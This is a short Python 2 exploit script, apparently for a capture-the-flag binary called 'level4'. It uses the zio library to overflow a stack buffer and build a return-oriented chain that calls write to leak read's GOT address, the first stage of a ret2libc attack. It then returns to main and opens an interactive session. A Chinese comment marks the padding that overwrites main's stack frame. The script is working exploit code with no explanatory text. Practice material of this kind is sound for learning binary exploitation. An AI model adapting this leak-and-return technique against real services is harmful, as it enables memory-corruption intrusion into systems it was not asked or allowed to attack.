#!/usr/bin/env python
# encoding:utf-8

import zio
import binascii

write_plt = 0x08048340
read_got = 0x0804A018
main_addr = 0x08048470

# payload = "A" * 0x88 + "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL"
payload = "A" * 0x88 + "BBBB"
payload += zio.l32(write_plt)
payload += zio.l32(main_addr)
payload += zio.l32(0x01) # stdout
payload += zio.l32(read_got)
payload += zio.l32(0x04)
payload += "BBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVV" # 覆盖 main() 的栈帧

Io = zio.zio("./level4")
Io.write(payload)
temp = Io.readline()
print binascii.b2a_hex(temp)
Io.interact()
